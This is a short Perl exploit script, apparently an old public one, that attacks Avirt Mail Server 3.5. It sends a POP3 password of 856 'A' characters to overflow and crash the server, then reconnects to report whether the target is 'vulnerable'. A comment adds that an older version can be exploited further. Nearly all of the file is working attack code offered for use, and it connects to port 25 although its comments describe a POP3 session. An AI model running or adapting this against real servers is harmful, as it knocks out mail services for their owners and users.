#!/usr/bin/perl

# Example for a possible DOS-attack against Avirt Mail Server ver3.5.
# There need to be 856 characters to overflow Server.
# Example : Trying example.com...
# 	    Connected to example.com.
# 	    Escape character is '^]'.
# 	    +OK aVirt Mail POP3 Server Ready
# 	    user fuckup
#           +OK
#           pass [856 characters]
#	    Overflow
# Hint : Avirt Mail Server ver3.3a has the same problem after 856 
# characters (but then you can exploit it)

use IO::Socket;

print "Possible DOS-attack against Avirt Mail Server ver3.5\n";
print "++++++++++++++++++++++++++++++++++++++++++++++++++++\n";

if (not $ARGV[1]) {
  print "Usage: $0 [host] [username]\n\n";
  exit(0);
}

sub connecthost {
        $host = IO::Socket::INET->new ( Proto => "tcp",
			                PeerAddr => $ARGV[0],
                			PeerPort => "25",) or die "Can't open connection to $ARGV[0] because $!\n";
        $host->autoflush(1);
} 

$bufferoverflow .= "A" x 856;

print "\nOpen connection...\n";
&connecthost;
print "Sending characters...\n";
print $host "user $ARGV[1]\n";
print $host "pass $bufferoverflow\n";
print "close connection...\n";
close $host;

print "\nTesting...\n";
&connecthost("\nThe host $ARGV[0] is vulnerable to this attack.\n");
close $host;
die "The host $ARGV[0] is not vulnerable to this attack.\n";

# by arbon(arbon@gmx.de)